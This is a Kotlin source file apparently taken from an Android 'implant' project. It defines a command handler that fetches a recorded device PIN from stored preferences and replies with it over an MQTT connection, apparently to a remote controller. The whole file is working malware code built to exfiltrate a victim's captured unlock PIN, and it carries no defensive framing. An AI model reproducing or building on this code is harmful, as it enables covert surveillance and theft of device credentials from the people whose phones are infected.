package com.cooperthecoder.implant.command.handlers

import android.content.Context
import com.cooperthecoder.implant.command.Command
import com.cooperthecoder.implant.data.SharedPreferencesQuery
import org.eclipse.paho.android.service.MqttAndroidClient

class PinHandler(context: Context, client: MqttAndroidClient, command: Command) : CommandHandler(context, client, command) {

    override fun action() {
        val pin = SharedPreferencesQuery.getNextPin(context)
        if (pin != null) {
            reply(pin, "")
        } else {
            reply("", "No PIN recorded yet")
        }
    }
}